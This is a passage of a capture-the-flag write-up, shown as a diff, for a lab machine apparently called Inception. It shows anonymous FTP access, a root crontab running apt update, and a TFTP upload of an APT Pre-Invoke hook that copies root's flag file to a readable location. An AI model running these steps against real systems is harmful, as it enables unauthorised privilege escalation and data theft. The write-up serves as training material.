@@ -261,24 +261,114 @@ root@Inception:~# for i in $(seq 1 65535); do timeout 0.1 bash -c " echo &> /dev
 
 It does take some time to complete, but hey, whose complaining! :D
 
+We see 21 is open, lets try anonymous ftp login
+
+```
+root@Inception:/tmp/dotalol# ftp 192.168.0.1
+ftp 192.168.0.1
+Connected to 192.168.0.1.
+220 (vsFTPd 3.0.3)
+Name (192.168.0.1:cobb): anonymous
+anonymous
+331 Please specify the password.
+Password:anonymous
+
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
 
 
+We have pretty decent perms even with the anon user, after some enum we find something peculiar in the crontab
 
+```
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
+30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
+```
 
+So, root runs apt update every 5th minute!
 
+After doing some research we find out that the update command can have Pre-Invoke and Post-Invoke hooks!
 
+[Link](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/)
+
+We keep learning something new everyday dont we :D
+
+So, we need something like this
+```
+APT::Update::Pre-Invoke {“/bin/cp /root/root.txt /tmp/.dotalol.txt; chmod 755 /tmp/.dotalol.txt”};
+```
+inside the 100update so that it would copy the root.txt and make it readable.
+
+We check the ```/etc/apt/apt.conf.d/``` folder and there is no 100update file
+
+Lets create one and upload it with ftp
+
+```
+root@Inception:/tmp/dotalol# echo "APT::Update::Pre-Invoke {“/bin/cp /root/root.txt /tmp/.dotalol.txt; chmod 755 /tmp/.dotalol.txt”};" > 100update
+
+root@Inception:/tmp/dotalol# cat 100	
+APT::Update::Pre-Invoke {“/bin/cp /root/root.txt /var/tmp/dotalol.txt; chmod 755 /var/tmp/dotalol.txt”};
+```
+
+```
+ftp> put 100update
+put 100update
+local: 100update remote: 100update
+200 PORT command successful. Consider using PASV.
+550 Permission denied.
+```
+
+:thinking:
+
+After doing a little more enum we find another user in the passwd file
+```
+tftp:x:112:119:tftp daemon,,,:/var/lib/tftpboot:/bin/false
+```
+
+Looks like we got a tftp daemon running as well 
+
+Lets try and connect to tftp , if it works then we can assume the port 69 is open (udp)
+
+```
+root@Inception:/tmp/dotalol# tftp 192.168.0.1
+tftp 192.168.0.1
+tftp> put 100update /etc/apt/apt.conf.d/100update
+put 100update /etc/apt/apt.conf.d/100update
+Sent 104 bytes in 0.0 seconds
+```
+
+Boo Yeah!!!
+
+We check with ftp and we see that the file was successfully uploaded
+
+```
+ftp> ls
+ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+..
+..
+-rw-rw-rw-    1 0        0             103 Dec 23 20:02 100update
+..
+```
+
+Now we just wait for 5 mins and check the /tmp later
 
 
 ```
-IMAGE:
-<kbd><img src="https://github.com/jakobgoerke/HTB-Writeups/blob/master/Tally/images/Website.PNG"></kbd>
 
-
-TABLE:
-
-| IP                  | FQDN                        |
-| -------------       |:-------------------------:  |
-| 10.10.10.65:443     | calvin.ariekei.htb          |
-| 10.10.10.65:443     | beehive.ariekei.htb         |
 ```
+
+
+Still waiting for root.txt
+<kbd><img src="https://media.giphy.com/media/3ohs7Xldjh7DndQnBu/giphy.gif"></kbd>
